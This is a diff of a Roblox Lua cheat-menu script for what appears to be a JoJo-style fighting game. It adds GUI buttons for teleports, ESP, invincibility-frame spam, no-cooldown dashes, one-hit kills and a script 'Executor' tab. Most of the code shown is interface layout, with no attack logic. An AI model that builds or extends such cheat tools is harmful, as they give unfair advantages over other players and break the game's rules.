+TPButtonBossEntrance.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+TPButtonBossEntrance.BorderColor3 = Color3.fromRGB(255, 255, 255)
+TPButtonBossEntrance.BorderSizePixel = 2
+TPButtonBossEntrance.Position = UDim2.new(0.39564085, 0, 0.800000012, 0)
+TPButtonBossEntrance.Size = UDim2.new(0, 75, 0, 36)
+TPButtonBossEntrance.Font = Enum.Font.SourceSans
+TPButtonBossEntrance.Text = "Boss Arena"
+TPButtonBossEntrance.TextColor3 = Color3.fromRGB(0, 0, 0)
+TPButtonBossEntrance.TextSize = 14.000
+TPButtonBossEntrance.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
+TPButtonBossEntrance.TextStrokeTransparency = 0.000
+
+TPButtonMiddle.Name = "TPButtonMiddle"
+TPButtonMiddle.Parent = Tab7_2
+TPButtonMiddle.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+TPButtonMiddle.BorderColor3 = Color3.fromRGB(255, 255, 255)
+TPButtonMiddle.BorderSizePixel = 2
+TPButtonMiddle.Position = UDim2.new(0.745155394, 0, 0.608035684, 0)
+TPButtonMiddle.Size = UDim2.new(0, 75, 0, 36)
+TPButtonMiddle.Font = Enum.Font.SourceSans
+TPButtonMiddle.Text = "Middle"
+TPButtonMiddle.TextColor3 = Color3.fromRGB(0, 0, 0)
+TPButtonMiddle.TextSize = 14.000
+TPButtonMiddle.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
+TPButtonMiddle.TextStrokeTransparency = 0.000
+
+TPButtonZeldaMoon.Name = "TPButtonZeldaMoon"
+TPButtonZeldaMoon.Parent = Tab7_2
+TPButtonZeldaMoon.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+TPButtonZeldaMoon.BorderColor3 = Color3.fromRGB(255, 255, 255)
+TPButtonZeldaMoon.BorderSizePixel = 2
+TPButtonZeldaMoon.Position = UDim2.new(0.745155394, 0, 0.421535701, 0)
+TPButtonZeldaMoon.Size = UDim2.new(0, 75, 0, 36)
+TPButtonZeldaMoon.Font = Enum.Font.SourceSans
+TPButtonZeldaMoon.Text = "Zelda Moon"
+TPButtonZeldaMoon.TextColor3 = Color3.fromRGB(0, 0, 0)
+TPButtonZeldaMoon.TextSize = 14.000
+TPButtonZeldaMoon.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
+TPButtonZeldaMoon.TextStrokeTransparency = 0.000
+
+TPButtonRachaelHouse.Name = "TPButtonRachaelHouse"
+TPButtonRachaelHouse.Parent = Tab7_2
+TPButtonRachaelHouse.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+TPButtonRachaelHouse.BorderColor3 = Color3.fromRGB(255, 255, 255)
+TPButtonRachaelHouse.BorderSizePixel = 2
+TPButtonRachaelHouse.Position = UDim2.new(0.745155394, 0, 0.233500004, 0)
+TPButtonRachaelHouse.Size = UDim2.new(0, 75, 0, 36)
+TPButtonRachaelHouse.Font = Enum.Font.SourceSans
+TPButtonRachaelHouse.Text = "Shed"
+TPButtonRachaelHouse.TextColor3 = Color3.fromRGB(0, 0, 0)
+TPButtonRachaelHouse.TextSize = 14.000
+TPButtonRachaelHouse.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
+TPButtonRachaelHouse.TextStrokeTransparency = 0.000
+
+TPButtonD4C.Name = "TPButtonD4C"
+TPButtonD4C.Parent = Tab7_2
+TPButtonD4C.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+TPButtonD4C.BorderColor3 = Color3.fromRGB(255, 255, 255)
+TPButtonD4C.BorderSizePixel = 2
+TPButtonD4C.Position = UDim2.new(0.745155394, 0, 0.800000012, 0)
+TPButtonD4C.Size = UDim2.new(0, 75, 0, 36)
+TPButtonD4C.Font = Enum.Font.SourceSans
+TPButtonD4C.Text = "D4C Universe"
+TPButtonD4C.TextColor3 = Color3.fromRGB(0, 0, 0)
+TPButtonD4C.TextSize = 14.000
+TPButtonD4C.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
+TPButtonD4C.TextStrokeTransparency = 0.000
 
 Tab4_2.Name = "Tab4"
 Tab4_2.Parent = Tabs
@@ -640,7 +929,7 @@ VTWKnife.BorderSizePixel = 0
 VTWKnife.Position = UDim2.new(0.0825242698, 0, 0.129464284, 0)
 VTWKnife.Size = UDim2.new(0, 200, 0, 50)
 VTWKnife.Font = Enum.Font.ArialBold
-VTWKnife.Text = "VTW Knife (1, K)"
+VTWKnife.Text = "VTW Knife (K to Delete)"
 VTWKnife.TextColor3 = Color3.fromRGB(0, 0, 0)
 VTWKnife.TextScaled = true
 VTWKnife.TextSize = 14.000
@@ -656,17 +945,94 @@ VTWKnifeButton.Position = UDim2.new(1.04999995, 0, 0.180000007, 0)
 VTWKnifeButton.Size = UDim2.new(0, 20, 0, 32)
 VTWKnifeButton.Image = "http://www.roblox.com/asset/?id=107075188558816"
 
-TextLabel_6.Parent = Tab4_2
-TextLabel_6.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-TextLabel_6.BorderColor3 = Color3.fromRGB(0, 0, 0)
-TextLabel_6.BorderSizePixel = 5
-TextLabel_6.Size = UDim2.new(0, 412, 0, 22)
-TextLabel_6.Font = Enum.Font.Unknown
-TextLabel_6.Text = "TAB 4"
-TextLabel_6.TextColor3 = Color3.fromRGB(0, 0, 0)
-TextLabel_6.TextScaled = true
-TextLabel_6.TextSize = 14.000
-TextLabel_6.TextWrapped = true
+TextLabel_8.Parent = VTWKnife
+TextLabel_8.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_8.BackgroundTransparency = 1.000
+TextLabel_8.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel_8.BorderSizePixel = 0
+TextLabel_8.Position = UDim2.new(1, 0, 0, 0)
+TextLabel_8.Size = UDim2.new(0, 200, 0, 28)
+TextLabel_8.Font = Enum.Font.ArialBold
+TextLabel_8.Text = "Bind A Key"
+TextLabel_8.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel_8.TextSize = 25.000
+TextLabel_8.TextWrapped = true
+
+Keybind_2.Name = "Keybind"
+Keybind_2.Parent = TextLabel_8
+Keybind_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Keybind_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
+Keybind_2.BorderSizePixel = 5
+Keybind_2.Position = UDim2.new(0.305000007, 0, 0.969522178, 0)
+Keybind_2.Size = UDim2.new(0, 70, 0, 30)
+Keybind_2.Font = Enum.Font.SourceSans
+Keybind_2.Text = ""
+Keybind_2.TextColor3 = Color3.fromRGB(0, 0, 0)
+Keybind_2.TextScaled = true
+Keybind_2.TextSize = 14.000
+Keybind_2.TextWrapped = true
+
+TextLabel_9.Parent = Tab4_2
+TextLabel_9.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_9.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel_9.BorderSizePixel = 5
+TextLabel_9.Size = UDim2.new(0, 412, 0, 22)
+TextLabel_9.Font = Enum.Font.Unknown
+TextLabel_9.Text = "TAB 4"
+TextLabel_9.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel_9.TextScaled = true
+TextLabel_9.TextSize = 14.000
+TextLabel_9.TextWrapped = true
+
+OniIFrames.Name = "OniIFrames"
+OniIFrames.Parent = Tab4_2
+OniIFrames.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+OniIFrames.BackgroundTransparency = 1.000
+OniIFrames.BorderColor3 = Color3.fromRGB(0, 0, 0)
+OniIFrames.BorderSizePixel = 0
+OniIFrames.Position = UDim2.new(0.0825242698, 0, 0.40625, 0)
+OniIFrames.Size = UDim2.new(0, 200, 0, 50)
+OniIFrames.Font = Enum.Font.ArialBold
+OniIFrames.Text = "Spam IFrames"
+OniIFrames.TextColor3 = Color3.fromRGB(0, 0, 0)
+OniIFrames.TextScaled = true
+OniIFrames.TextSize = 14.000
+OniIFrames.TextWrapped = true
+
+OniIFramesButton.Name = "OniIFramesButton"
+OniIFramesButton.Parent = OniIFrames
+OniIFramesButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+OniIFramesButton.BackgroundTransparency = 1.000
+OniIFramesButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
+OniIFramesButton.BorderSizePixel = 0
+OniIFramesButton.Position = UDim2.new(1.04999995, 0, 0.180000007, 0)
+OniIFramesButton.Size = UDim2.new(0, 20, 0, 32)
+OniIFramesButton.Image = "http://www.roblox.com/asset/?id=107075188558816"
+
+EpiWarning.Name = "EpiWarning"
+EpiWarning.Parent = Tab4_2
+EpiWarning.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+EpiWarning.BackgroundTransparency = 1.000
+EpiWarning.BorderColor3 = Color3.fromRGB(0, 0, 0)
+EpiWarning.BorderSizePixel = 0
+EpiWarning.Position = UDim2.new(0.0825242698, 0, 0.705357134, 0)
+EpiWarning.Size = UDim2.new(0, 200, 0, 50)
+EpiWarning.Font = Enum.Font.ArialBold
+EpiWarning.Text = "Epitaph ESP"
+EpiWarning.TextColor3 = Color3.fromRGB(0, 0, 0)
+EpiWarning.TextScaled = true
+EpiWarning.TextSize = 14.000
+EpiWarning.TextWrapped = true
+
+EpiWarningButton.Name = "EpiWarningButton"
+EpiWarningButton.Parent = EpiWarning
+EpiWarningButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+EpiWarningButton.BackgroundTransparency = 1.000
+EpiWarningButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
+EpiWarningButton.BorderSizePixel = 0
+EpiWarningButton.Position = UDim2.new(1.04999995, 0, 0.180000007, 0)
+EpiWarningButton.Size = UDim2.new(0, 20, 0, 32)
+EpiWarningButton.Image = "http://www.roblox.com/asset/?id=107075188558816"
 
 Tab3_2.Name = "Tab3"
 Tab3_2.Parent = Tabs
@@ -676,43 +1042,71 @@ Tab3_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
 Tab3_2.BorderSizePixel = 5
 Tab3_2.Position = UDim2.new(0.201550394, 0, -0.00448430516, 0)
 Tab3_2.Size = UDim2.new(0, 412, 0, 224)
+Tab3_2.Visible = false
 
-ESplash_3.Name = "ESplash"
-ESplash_3.Parent = Tab3_2
-ESplash_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-ESplash_3.BackgroundTransparency = 1.000
-ESplash_3.BorderColor3 = Color3.fromRGB(0, 0, 0)
-ESplash_3.BorderSizePixel = 0
-ESplash_3.Position = UDim2.new(0.0825242698, 0, 0.129464284, 0)
-ESplash_3.Size = UDim2.new(0, 200, 0, 50)
-ESplash_3.Font = Enum.Font.ArialBold
-ESplash_3.Text = "Emerald Splash (LeftCtrl, K)"
-ESplash_3.TextColor3 = Color3.fromRGB(0, 0, 0)
-ESplash_3.TextScaled = true
-ESplash_3.TextSize = 14.000
-ESplash_3.TextWrapped = true
+ESplash.Name = "ESplash"
+ESplash.Parent = Tab3_2
+ESplash.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+ESplash.BackgroundTransparency = 1.000
+ESplash.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ESplash.BorderSizePixel = 0
+ESplash.Position = UDim2.new(0.0825242698, 0, 0.129464284, 0)
+ESplash.Size = UDim2.new(0, 200, 0, 50)
+ESplash.Font = Enum.Font.ArialBold
+ESplash.Text = "Emerald Splash (LeftCtrl, K)"
+ESplash.TextColor3 = Color3.fromRGB(0, 0, 0)
+ESplash.TextScaled = true
+ESplash.TextSize = 14.000
+ESplash.TextWrapped = true
 
-ESplashButton_3.Name = "ESplashButton"
-ESplashButton_3.Parent = ESplash_3
-ESplashButton_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-ESplashButton_3.BackgroundTransparency = 1.000
-ESplashButton_3.BorderColor3 = Color3.fromRGB(0, 0, 0)
-ESplashButton_3.BorderSizePixel = 0
-ESplashButton_3.Position = UDim2.new(1.04999995, 0, 0.180000007, 0)
-ESplashButton_3.Size = UDim2.new(0, 20, 0, 32)
-ESplashButton_3.Image = "http://www.roblox.com/asset/?id=107075188558816"
+ESplashButton.Name = "ESplashButton"
+ESplashButton.Parent = ESplash
+ESplashButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+ESplashButton.BackgroundTransparency = 1.000
+ESplashButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ESplashButton.BorderSizePixel = 0
+ESplashButton.Position = UDim2.new(1.04999995, 0, 0.180000007, 0)
+ESplashButton.Size = UDim2.new(0, 20, 0, 32)
+ESplashButton.Image = "http://www.roblox.com/asset/?id=107075188558816"
 
-TextLabel_7.Parent = Tab3_2
-TextLabel_7.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-TextLabel_7.BorderColor3 = Color3.fromRGB(0, 0, 0)
-TextLabel_7.BorderSizePixel = 5
-TextLabel_7.Size = UDim2.new(0, 412, 0, 22)
-TextLabel_7.Font = Enum.Font.Unknown
-TextLabel_7.Text = "TAB 3"
-TextLabel_7.TextColor3 = Color3.fromRGB(0, 0, 0)
-TextLabel_7.TextScaled = true
-TextLabel_7.TextSize = 14.000
-TextLabel_7.TextWrapped = true
+TextLabel_10.Parent = ESplash
+TextLabel_10.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_10.BackgroundTransparency = 1.000
+TextLabel_10.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel_10.BorderSizePixel = 0
+TextLabel_10.Position = UDim2.new(1, 0, 0, 0)
+TextLabel_10.Size = UDim2.new(0, 200, 0, 28)
+TextLabel_10.Font = Enum.Font.ArialBold
+TextLabel_10.Text = "Bind A Key"
+TextLabel_10.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel_10.TextSize = 25.000
+TextLabel_10.TextWrapped = true
+
+Keybind_3.Name = "Keybind"
+Keybind_3.Parent = TextLabel_10
+Keybind_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Keybind_3.BorderColor3 = Color3.fromRGB(0, 0, 0)
+Keybind_3.BorderSizePixel = 5
+Keybind_3.Position = UDim2.new(0.305000007, 0, 0.969522178, 0)
+Keybind_3.Size = UDim2.new(0, 70, 0, 30)
+Keybind_3.Font = Enum.Font.SourceSans
+Keybind_3.Text = ""
+Keybind_3.TextColor3 = Color3.fromRGB(0, 0, 0)
+Keybind_3.TextScaled = true
+Keybind_3.TextSize = 14.000
+Keybind_3.TextWrapped = true
+
+TextLabel_11.Parent = Tab3_2
+TextLabel_11.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_11.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel_11.BorderSizePixel = 5
+TextLabel_11.Size = UDim2.new(0, 412, 0, 22)
+TextLabel_11.Font = Enum.Font.Unknown
+TextLabel_11.Text = "TAB 3"
+TextLabel_11.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel_11.TextScaled = true
+TextLabel_11.TextSize = 14.000
+TextLabel_11.TextWrapped = true
 
 SpamSounds.Name = "SpamSounds"
 SpamSounds.Parent = Tab3_2
@@ -754,15 +1148,15 @@ TSMovement.TextScaled = true
 TSMovement.TextSize = 14.000
 TSMovement.TextWrapped = true
 
-SpamSoundsButton_2.Name = "SpamSoundsButton"
-SpamSoundsButton_2.Parent = TSMovement
-SpamSoundsButton_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-SpamSoundsButton_2.BackgroundTransparency = 1.000
-SpamSoundsButton_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
-SpamSoundsButton_2.BorderSizePixel = 0
-SpamSoundsButton_2.Position = UDim2.new(1.04999995, 0, 0.180000007, 0)
-SpamSoundsButton_2.Size = UDim2.new(0, 20, 0, 32)
-SpamSoundsButton_2.Image = "http://www.roblox.com/asset/?id=107075188558816"
+TSMovementButton.Name = "TSMovementButton"
+TSMovementButton.Parent = TSMovement
+TSMovementButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TSMovementButton.BackgroundTransparency = 1.000
+TSMovementButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TSMovementButton.BorderSizePixel = 0
+TSMovementButton.Position = UDim2.new(1.04999995, 0, 0.180000007, 0)
+TSMovementButton.Size = UDim2.new(0, 20, 0, 32)
+TSMovementButton.Image = "http://www.roblox.com/asset/?id=107075188558816"
 
 Tab5_2.Name = "Tab5"
 Tab5_2.Parent = Tabs
@@ -774,42 +1168,92 @@ Tab5_2.Position = UDim2.new(0.201550394, 0, -0.00448430516, 0)
 Tab5_2.Size = UDim2.new(0, 412, 0, 224)
 Tab5_2.Visible = false
 
-ESplash_4.Name = "ESplash"
-ESplash_4.Parent = Tab5_2
-ESplash_4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-ESplash_4.BackgroundTransparency = 1.000
-ESplash_4.BorderColor3 = Color3.fromRGB(0, 0, 0)
-ESplash_4.BorderSizePixel = 0
-ESplash_4.Position = UDim2.new(0.0825242698, 0, 0.129464284, 0)
-ESplash_4.Size = UDim2.new(0, 200, 0, 50)
-ESplash_4.Font = Enum.Font.ArialBold
-ESplash_4.Text = "Emerald Splash"
-ESplash_4.TextColor3 = Color3.fromRGB(0, 0, 0)
-ESplash_4.TextScaled = true
-ESplash_4.TextSize = 14.000
-ESplash_4.TextWrapped = true
+SpinDash.Name = "SpinDash"
+SpinDash.Parent = Tab5_2
+SpinDash.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+SpinDash.BackgroundTransparency = 1.000
+SpinDash.BorderColor3 = Color3.fromRGB(0, 0, 0)
+SpinDash.BorderSizePixel = 0
+SpinDash.Position = UDim2.new(0.0825242698, 0, 0.129464284, 0)
+SpinDash.Size = UDim2.new(0, 200, 0, 50)
+SpinDash.Font = Enum.Font.ArialBold
+SpinDash.Text = "No Cooldown Dash (Supports most stands, no spec support)"
+SpinDash.TextColor3 = Color3.fromRGB(0, 0, 0)
+SpinDash.TextScaled = true
+SpinDash.TextSize = 14.000
+SpinDash.TextWrapped = true
 
-ESplashButton_4.Name = "ESplashButton"
-ESplashButton_4.Parent = ESplash_4
-ESplashButton_4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-ESplashButton_4.BackgroundTransparency = 1.000
-ESplashButton_4.BorderColor3 = Color3.fromRGB(0, 0, 0)
-ESplashButton_4.BorderSizePixel = 0
-ESplashButton_4.Position = UDim2.new(1.04999995, 0, 0.180000007, 0)
-ESplashButton_4.Size = UDim2.new(0, 20, 0, 32)
-ESplashButton_4.Image = "http://www.roblox.com/asset/?id=107075188558816"
+SpinDashButton.Name = "SpinDashButton"
+SpinDashButton.Parent = SpinDash
+SpinDashButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+SpinDashButton.BackgroundTransparency = 1.000
+SpinDashButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
+SpinDashButton.BorderSizePixel = 0
+SpinDashButton.Position = UDim2.new(1.04999995, 0, 0.180000007, 0)
+SpinDashButton.Size = UDim2.new(0, 20, 0, 32)
+SpinDashButton.Image = "http://www.roblox.com/asset/?id=107075188558816"
 
-TextLabel_8.Parent = Tab5_2
-TextLabel_8.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-TextLabel_8.BorderColor3 = Color3.fromRGB(0, 0, 0)
-TextLabel_8.BorderSizePixel = 5
-TextLabel_8.Size = UDim2.new(0, 412, 0, 22)
-TextLabel_8.Font = Enum.Font.Unknown
-TextLabel_8.Text = "TAB 1"
-TextLabel_8.TextColor3 = Color3.fromRGB(0, 0, 0)
-TextLabel_8.TextScaled = true
-TextLabel_8.TextSize = 14.000
-TextLabel_8.TextWrapped = true
+TextLabel_12.Parent = Tab5_2
+TextLabel_12.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_12.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel_12.BorderSizePixel = 5
+TextLabel_12.Size = UDim2.new(0, 412, 0, 22)
+TextLabel_12.Font = Enum.Font.Unknown
+TextLabel_12.Text = "TAB 5"
+TextLabel_12.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel_12.TextScaled = true
+TextLabel_12.TextSize = 14.000
+TextLabel_12.TextWrapped = true
+
+StandlessCounter.Name = "StandlessCounter"
+StandlessCounter.Parent = Tab5_2
+StandlessCounter.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+StandlessCounter.BackgroundTransparency = 1.000
+StandlessCounter.BorderColor3 = Color3.fromRGB(0, 0, 0)
+StandlessCounter.BorderSizePixel = 0
+StandlessCounter.Position = UDim2.new(0.0825242698, 0, 0.705357134, 0)
+StandlessCounter.Size = UDim2.new(0, 200, 0, 50)
+StandlessCounter.Font = Enum.Font.ArialBold
+StandlessCounter.Text = "Standless Counter"
+StandlessCounter.TextColor3 = Color3.fromRGB(0, 0, 0)
+StandlessCounter.TextScaled = true
+StandlessCounter.TextSize = 14.000
+StandlessCounter.TextWrapped = true
+
+StandlessCounterButton.Name = "StandlessCounterButton"
+StandlessCounterButton.Parent = StandlessCounter
+StandlessCounterButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+StandlessCounterButton.BackgroundTransparency = 1.000
+StandlessCounterButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
+StandlessCounterButton.BorderSizePixel = 0
+StandlessCounterButton.Position = UDim2.new(1.04999995, 0, 0.180000007, 0)
+StandlessCounterButton.Size = UDim2.new(0, 20, 0, 32)
+StandlessCounterButton.Image = "http://www.roblox.com/asset/?id=107075188558816"
+
+VTW1TapsBar.Name = "VTW1TapsBar"
+VTW1TapsBar.Parent = Tab5_2
+VTW1TapsBar.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+VTW1TapsBar.BackgroundTransparency = 1.000
+VTW1TapsBar.BorderColor3 = Color3.fromRGB(0, 0, 0)
+VTW1TapsBar.BorderSizePixel = 0
+VTW1TapsBar.Position = UDim2.new(0.0825242698, 0, 0.40625, 0)
+VTW1TapsBar.Size = UDim2.new(0, 200, 0, 50)
+VTW1TapsBar.Font = Enum.Font.ArialBold
+VTW1TapsBar.Text = "VTW 1 Taps"
+VTW1TapsBar.TextColor3 = Color3.fromRGB(0, 0, 0)
+VTW1TapsBar.TextScaled = true
+VTW1TapsBar.TextSize = 14.000
+VTW1TapsBar.TextWrapped = true
+
+VTW1TapsButton.Name = "VTW1TapsButton"
+VTW1TapsButton.Parent = VTW1TapsBar
+VTW1TapsButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+VTW1TapsButton.BackgroundTransparency = 1.000
+VTW1TapsButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
+VTW1TapsButton.BorderSizePixel = 0
+VTW1TapsButton.Position = UDim2.new(1.04999995, 0, 0.180000007, 0)
+VTW1TapsButton.Size = UDim2.new(0, 20, 0, 32)
+VTW1TapsButton.Image = "http://www.roblox.com/asset/?id=107075188558816"
 
 Settings.Name = "Settings"
 Settings.Parent = Tabs
@@ -1103,6 +1547,51 @@ ProfilePicture.Position = UDim2.new(0.389534891, 0, 0, 0)
 ProfilePicture.Size = UDim2.new(0, 25, 0, 25)
 ProfilePicture.Image = "rbxassetid://1"
 
+SidebarMusic.Name = "SidebarMusic"
+SidebarMusic.Parent = Frame
+SidebarMusic.BackgroundColor3 = Color3.fromRGB(167, 167, 167)
+SidebarMusic.BackgroundTransparency = 0.300
+SidebarMusic.BorderColor3 = Color3.fromRGB(0, 0, 0)
+SidebarMusic.BorderSizePixel = 5
+SidebarMusic.Position = UDim2.new(1.00999999, 0, 0.966000021, 0)
+SidebarMusic.Size = UDim2.new(0, 77, 0, 224)
+SidebarMusic.Visible = false
+
+ScrollingFrame_3.Parent = SidebarMusic
+ScrollingFrame_3.Active = true
+ScrollingFrame_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+ScrollingFrame_3.BackgroundTransparency = 1.000
+ScrollingFrame_3.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ScrollingFrame_3.BorderSizePixel = 0
+ScrollingFrame_3.Size = UDim2.new(0, 77, 0, 224)
+ScrollingFrame_3.ScrollBarThickness = 10
+ScrollingFrame_3.VerticalScrollBarPosition = Enum.VerticalScrollBarPosition.Left
+
+Lofi.Name = "Lofi"
+Lofi.Parent = ScrollingFrame_3
+Lofi.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+Lofi.BorderColor3 = Color3.fromRGB(0, 0, 0)
+Lofi.BorderSizePixel = 0
+Lofi.Position = UDim2.new(0.169, 0, 0.0299999993, 0)
+Lofi.Size = UDim2.new(0, 64, 0, 29)
+Lofi.Font = Enum.Font.SourceSans
+Lofi.Text = "Lofi Playlist"
+Lofi.TextColor3 = Color3.fromRGB(255, 255, 255)
+Lofi.TextScaled = true
+Lofi.TextSize = 14.000
+Lofi.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
+Lofi.TextWrapped = true
+
+Music.Name = "Music"
+Music.Parent = Frame
+Music.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Music.BackgroundTransparency = 1.000
+Music.BorderColor3 = Color3.fromRGB(0, 0, 0)
+Music.BorderSizePixel = 0
+Music.Position = UDim2.new(0.691860437, 0, 0, 0)
+Music.Size = UDim2.new(0, 25, 0, 25)
+Music.Image = "rbxassetid://12159177184"
+
 FullView.Name = "FullView"
 FullView.Parent = ScreenGui
 FullView.BackgroundColor3 = Color3.fromRGB(167, 167, 167)
@@ -1119,9 +1608,27 @@ FullView.TextScaled = true
 FullView.TextSize = 14.000
 FullView.TextWrapped = true
 
+SFX.Name = "SFX"
+SFX.Parent = ScreenGui
+
+Music_2.Name = "Music"
+Music_2.Parent = SFX
+
+Rock.Name = "Rock"
+Rock.Parent = Music_2
+
+Lofi_2.Name = "Lofi"
+Lofi_2.Parent = Music_2
+
+Retro.Name = "Retro"
+Retro.Parent = Music_2
+
+UI.Name = "UI"
+UI.Parent = SFX
+
 -- Scripts:
 wait(1.5)
-local function MDDB_fake_script() -- Frame.DragGUI 
+local function QTMV_fake_script() -- Frame.DragGUI 
 	local script = Instance.new('LocalScript', Frame)
 
 	--// Services
@@ -1178,8 +1685,8 @@ local function MDDB_fake_script() -- Frame.DragGUI
 		end
 	end)
 end
-coroutine.wrap(MDDB_fake_script)()
-local function ZQTVT_fake_script() -- Tab1.Tab1 
+coroutine.wrap(QTMV_fake_script)()
+local function BTAZL_fake_script() -- Tab1.Tab1 
 	local script = Instance.new('LocalScript', Tab1)
 
 	script.Parent.Activated:Connect(function()
@@ -1196,8 +1703,8 @@ local function ZQTVT_fake_script() -- Tab1.Tab1
 		tabs.Executor.Visible = false
 	end)
 end
-coroutine.wrap(ZQTVT_fake_script)()
-local function GAYDJ_fake_script() -- Tab2.Tab2 
+coroutine.wrap(BTAZL_fake_script)()
+local function XZVBR_fake_script() -- Tab2.Tab2 
 	local script = Instance.new('LocalScript', Tab2)
 
 	script.Parent.Activated:Connect(function()
@@ -1214,8 +1721,8 @@ local function GAYDJ_fake_script() -- Tab2.Tab2
 		tabs.Executor.Visible = false
 	end)
 end
-coroutine.wrap(GAYDJ_fake_script)()
-local function QPUU_fake_script() -- Tab4.Tab4 
+coroutine.wrap(XZVBR_fake_script)()
+local function SAMF_fake_script() -- Tab4.Tab4 
 	local script = Instance.new('LocalScript', Tab4)
 
 	script.Parent.Activated:Connect(function()
@@ -1232,8 +1739,8 @@ local function QPUU_fake_script() -- Tab4.Tab4
 		tabs.Executor.Visible = false
 	end)
 end
-coroutine.wrap(QPUU_fake_script)()
-local function DVGBUGE_fake_script() -- Tab3.Tab3 
+coroutine.wrap(SAMF_fake_script)()
+local function EOSUH_fake_script() -- Tab3.Tab3 
 	local script = Instance.new('LocalScript', Tab3)
 
 	script.Parent.Activated:Connect(function()
@@ -1250,8 +1757,8 @@ local function DVGBUGE_fake_script() -- Tab3.Tab3
 		tabs.Executor.Visible = false
 	end)
 end
-coroutine.wrap(DVGBUGE_fake_script)()
-local function NVGJ_fake_script() -- Tab6.Tab6 
+coroutine.wrap(EOSUH_fake_script)()
+local function GDBLQA_fake_script() -- Tab6.Tab6 
 	local script = Instance.new('LocalScript', Tab6)
 
 	script.Parent.Activated:Connect(function()
@@ -1268,8 +1775,8 @@ local function NVGJ_fake_script() -- Tab6.Tab6
 		tabs.Executor.Visible = false
 	end)
 end
-coroutine.wrap(NVGJ_fake_script)()
-local function HUHIEIB_fake_script() -- Tab5.Tab5 
+coroutine.wrap(GDBLQA_fake_script)()
+local function AJNIVRM_fake_script() -- Tab5.Tab5 
 	local script = Instance.new('LocalScript', Tab5)
 
 	script.Parent.Activated:Connect(function()
@@ -1286,8 +1793,8 @@ local function HUHIEIB_fake_script() -- Tab5.Tab5
 		tabs.Executor.Visible = false
 	end)
 end
-coroutine.wrap(HUHIEIB_fake_script)()
-local function MSAGUQR_fake_script() -- Executor.Executor 
+coroutine.wrap(AJNIVRM_fake_script)()
+local function AQWS_fake_script() -- Executor.Executor 
 	local script = Instance.new('LocalScript', Executor)
 
 	script.Parent.Activated:Connect(function()
@@ -1303,8 +1810,8 @@ local function MSAGUQR_fake_script() -- Executor.Executor
 		tabs.Executor.Visible = true
 	end)
 end
-coroutine.wrap(MSAGUQR_fake_script)()
-local function VAWUXK_fake_script() -- Tab7.Tab7 
+coroutine.wrap(AQWS_fake_script)()
+local function IAXW_fake_script() -- Tab7.Tab7 
 	local script = Instance.new('LocalScript', Tab7)
 
 	script.Parent.Activated:Connect(function()
@@ -1321,13 +1828,35 @@ local function VAWUXK_fake_script() -- Tab7.Tab7
 		tabs.Executor.Visible = false
 	end)
 end
-coroutine.wrap(VAWUXK_fake_script)()
-local function EFIO_fake_script() -- _15SecondTSButton.ButtonManager 
+coroutine.wrap(IAXW_fake_script)()
